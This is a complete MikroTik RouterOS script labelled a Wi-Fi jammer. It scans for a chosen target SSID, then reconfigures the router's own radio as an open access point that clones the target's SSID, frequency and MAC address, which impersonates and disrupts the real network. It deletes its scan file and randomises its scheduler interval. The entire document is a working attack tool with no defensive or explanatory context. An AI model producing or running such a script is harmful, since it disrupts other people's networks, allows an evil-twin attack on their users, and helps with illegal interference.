#-------------------------------------------------------------------------------
# MikroTik RouterOS Wi-Fi Jammer
#-------------------------------------------------------------------------------

#-------------------------------------------------------------------------------
# Settings
#-------------------------------------------------------------------------------
:local TARGETSSID "SomeSSID"
:local SCANDATFILENAME "scan.dat"
:local SCANDURATION 5
:local BASESCHEDULEDELAY 5

#-------------------------------------------------------------------------------
# Jammer
#-------------------------------------------------------------------------------
:foreach iface in=[/interface wireless find] do={
  /interface wireless scan $iface duration=$SCANDURATION save-file=$SCANDATFILENAME
  /interface wireless reset-configuration $iface
  :local text [/file get $SCANDATFILENAME contents]
  :local textLen [:len $text]
  :local startPos 0
  :local endPos 0
  :local line ""
  :do {
    :set endPos [:find $text "\n" $endPos]
    :set line [:pick $text $startPos $endPos]
    :set startPos ($endPos + 1)
    :local data [:toarray $line]
    :local mac [:pick $data 0]
    :local ssid [:pick $data 1]
    :local freq [:pick [:pick $data 2] 0 [:find [:pick $data 2] "/"]]
    :if ($ssid="'" . $TARGETSSID . "'") do={
      /interface wireless security-profiles set 0 mode=none supplicant-identity=""
      /interface wireless set $iface mode=ap-bridge ssid=$TARGETSSID frequency=$freq mac-address=$mac radio-name="" wps-mode=disabled
      /interface wireless enable $iface
      :log info "Jammed: $TARGETSSID $freq $mac"
    }
  } while ($startPos < $textLen)
}
/file remove $SCANDATFILENAME
:local random [:pick [/system clock get time] 7]
/system scheduler set "wifi-jammer" interval=($BASESCHEDULEDELAY + $random)
